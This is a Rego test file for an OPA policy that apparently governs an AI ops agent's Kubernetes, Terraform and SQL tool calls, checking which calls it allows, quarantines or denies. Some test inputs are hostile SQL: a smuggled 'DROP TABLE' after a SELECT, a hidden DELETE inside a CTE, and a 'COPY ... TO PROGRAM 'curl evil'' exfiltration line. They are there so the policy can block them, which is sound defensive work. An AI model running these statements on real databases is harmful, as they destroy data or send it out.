package elodea.infra_test

import rego.v1
import data.elodea.authz

expect(tool, args, action, rule) if {
	d := authz.decision with input as {"tool": tool, "arguments": args, "agent": "ops-agent", "raw_method": "tools/call"}
	d.action == action
	d.rule == rule
}

# ---------- Kubernetes ----------

test_k8s_reads_allowed if {
	expect("kubernetes.resource.list", {"namespace": "production", "kind": "Pod"}, "allow", "k8s_read_only")
	expect("kubernetes.pod.logs", {"namespace": "kube-system", "name": "coredns-0"}, "allow", "k8s_read_only")
}

test_k8s_change_outside_production_allowed if {
	expect("kubernetes.resource.delete", {"namespace": "staging", "kind": "Deployment", "name": "api"}, "allow", "k8s_change_non_production")
	expect("kubernetes.resource.apply", {"namespace": "dev-alice", "kind": "ConfigMap", "name": "flags"}, "allow", "k8s_change_non_production")
	expect("kubernetes.pod.exec", {"namespace": "staging", "name": "api-0"}, "allow", "k8s_change_non_production")
}

test_k8s_production_changes_held if {
	expect("kubernetes.resource.delete", {"namespace": "production", "kind": "Deployment", "name": "api"}, "quarantine", "k8s_production_change")
	expect("kubernetes.resource.apply", {"namespace": "payments-prod", "kind": "Deployment", "name": "api"}, "quarantine", "k8s_production_change")
	expect("kubernetes.deployment.restart", {"namespace": "PROD", "name": "api"}, "quarantine", "k8s_production_change")
	expect("kubernetes.pod.exec", {"namespace": "prod-eu", "name": "api-0"}, "quarantine", "k8s_exec_production")
}

test_k8s_production_pattern_does_not_overmatch if {
	expect("kubernetes.resource.apply", {"namespace": "products", "kind": "Service", "name": "catalog"}, "allow", "k8s_change_non_production")
	expect("kubernetes.resource.apply", {"namespace": "reproduce", "kind": "Job", "name": "bug-42"}, "allow", "k8s_change_non_production")
}

test_k8s_system_namespace_denied if {
	expect("kubernetes.resource.delete", {"namespace": "kube-system", "kind": "Pod", "name": "coredns-0"}, "deny", "k8s_system_namespace")
	expect("kubernetes.resource.apply", {"namespace": "kube-public", "kind": "ConfigMap", "name": "x"}, "deny", "k8s_system_namespace")
}

test_k8s_namespace_deletion if {
	expect("kubernetes.resource.delete", {"kind": "Namespace", "name": "preview-123"}, "quarantine", "k8s_delete_namespace")
	expect("kubernetes.resource.delete", {"kind": "namespace", "name": "production"}, "deny", "k8s_delete_protected_namespace")
	expect("kubernetes.resource.delete", {"kind": "Namespace", "name": "kube-system"}, "deny", "k8s_delete_protected_namespace")
}

test_k8s_missing_namespace_held if {
	expect("kubernetes.resource.apply", {"kind": "ClusterRole", "name": "admin-all"}, "quarantine", "k8s_namespace_unknown")
	expect("kubernetes.resource.delete", {"namespace": "", "kind": "Pod", "name": "x"}, "quarantine", "k8s_namespace_unknown")
	expect("kubernetes.resource.delete", {"namespace": 7, "kind": "Pod", "name": "x"}, "quarantine", "k8s_namespace_unknown")
}

test_k8s_scaling if {
	expect("kubernetes.deployment.scale", {"namespace": "production", "name": "api", "replicas": 6}, "allow", "k8s_scale_production")
	expect("kubernetes.deployment.scale", {"namespace": "production", "name": "api", "replicas": 0}, "quarantine", "k8s_scale_to_zero_production")
	expect("kubernetes.deployment.scale", {"namespace": "staging", "name": "api", "replicas": 0}, "allow", "k8s_change_non_production")
	expect("kubernetes.deployment.scale", {"namespace": "staging", "name": "api", "replicas": "3"}, "quarantine", "k8s_scale_invalid")
	expect("kubernetes.deployment.scale", {"namespace": "production", "name": "api", "replicas": 1.5}, "quarantine", "k8s_scale_invalid")
	expect("kubernetes.deployment.scale", {"namespace": "production", "name": "api", "replicas": -1}, "quarantine", "k8s_scale_invalid")
}

test_k8s_unknown_tool_default_deny if {
	expect("kubernetes.node.drain", {"name": "node-1"}, "deny", "default_deny")
}

# ---------- Terraform ----------

test_terraform_plan_allowed if {
	expect("terraform.plan", {"workspace": "production"}, "allow", "terraform_plan")
}

test_terraform_destroy_denied if {
	expect("terraform.destroy", {"workspace": "staging"}, "deny", "terraform_destroy_blocked")
}

test_terraform_safe_apply_allowed if {
	expect("terraform.apply", {"workspace": "staging", "changes": {"add": 3, "change": 1, "destroy": 0}}, "allow", "terraform_apply_safe")
}

test_terraform_apply_destroys_held if {
	expect("terraform.apply", {"workspace": "staging", "changes": {"add": 0, "change": 0, "destroy": 2}}, "quarantine", "terraform_apply_destroys")
	# Destroys are reported ahead of the production hold.
	expect("terraform.apply", {"workspace": "production", "changes": {"add": 1, "change": 0, "destroy": 1}}, "quarantine", "terraform_apply_destroys")
}

test_terraform_production_apply_held if {
	expect("terraform.apply", {"workspace": "prod-us", "changes": {"add": 1, "change": 0, "destroy": 0}}, "quarantine", "terraform_apply_production")
}

test_terraform_missing_plan_held if {
	expect("terraform.apply", {"workspace": "staging"}, "quarantine", "terraform_plan_unknown")
	expect("terraform.apply", {"workspace": "staging", "changes": {"add": 1, "change": 0}}, "quarantine", "terraform_plan_unknown")
	expect("terraform.apply", {"workspace": "staging", "changes": {"add": 1, "change": 0, "destroy": "0"}}, "quarantine", "terraform_plan_unknown")
	expect("terraform.apply", {"workspace": "staging", "changes": "none"}, "quarantine", "terraform_plan_unknown")
}

test_terraform_missing_workspace_held if {
	expect("terraform.apply", {"changes": {"add": 1, "change": 0, "destroy": 0}}, "quarantine", "terraform_workspace_unknown")
}

# ---------- SQL ----------

test_sql_reads_allowed if {
	expect("database.query", {"sql": "SELECT id, created_at FROM orders WHERE status = 'open'"}, "allow", "sql_read_only")
	expect("database.query", {"sql": "  with recent as (select * from updates) select count(*) from recent;"}, "allow", "sql_read_only")
	expect("database.query", {"sql": "EXPLAIN SELECT * FROM users"}, "allow", "sql_read_only")
}

test_sql_bounded_writes_allowed if {
	expect("database.query", {"sql": "INSERT INTO audit_notes (body) VALUES ('ok')"}, "allow", "sql_bounded_write")
	expect("database.query", {"sql": "UPDATE users SET plan = 'pro' WHERE id = 42"}, "allow", "sql_bounded_write")
	expect("database.query", {"sql": "delete from sessions where expires_at < now()"}, "allow", "sql_bounded_write")
}

test_sql_destructive_held if {
	expect("database.query", {"sql": "DROP TABLE users"}, "quarantine", "sql_destructive")
	expect("database.query", {"sql": "truncate orders"}, "quarantine", "sql_destructive")
}

test_sql_unbounded_writes_held if {
	expect("database.query", {"sql": "DELETE FROM users"}, "quarantine", "sql_unbounded_write")
	expect("database.query", {"sql": "update accounts set balance = 0"}, "quarantine", "sql_unbounded_write")
}

test_sql_schema_and_permission_changes_held if {
	expect("database.query", {"sql": "ALTER TABLE users ADD COLUMN x int"}, "quarantine", "sql_schema_or_permission_change")
	expect("database.query", {"sql": "GRANT ALL ON users TO agent"}, "quarantine", "sql_schema_or_permission_change")
}

test_sql_smuggled_writes_not_read_only if {
	expect("database.query", {"sql": "SELECT 1; DROP TABLE users"}, "quarantine", "sql_destructive")
	expect("database.query", {"sql": "SELECT 1; SELECT 2"}, "quarantine", "sql_multiple_statements")
	expect("database.query", {"sql": "WITH gone AS (DELETE FROM users RETURNING *) SELECT * FROM gone"}, "quarantine", "sql_unclassified")
	expect("database.query", {"sql": "COPY users TO PROGRAM 'curl evil'"}, "quarantine", "sql_unclassified")
}

test_sql_invalid_held if {
	expect("database.query", {}, "quarantine", "sql_invalid")
	expect("database.query", {"sql": "   "}, "quarantine", "sql_invalid")
	expect("database.query", {"sql": 42}, "quarantine", "sql_invalid")
}

# ---------- Aliases ----------

test_aliases_map_server_tool_names if {
	d := authz.decision with input as {"tool": "resources_delete", "arguments": {"namespace": "production", "kind": "Deployment", "name": "api"}, "agent": "a"}
		with authz.infra_tool_aliases as {"resources_delete": "kubernetes.resource.delete"}
	d.action == "quarantine"
	d.rule == "k8s_production_change"
}

test_unmapped_server_tool_default_deny if {
	expect("resources_delete", {"namespace": "staging", "kind": "Pod", "name": "x"}, "deny", "default_deny")
}
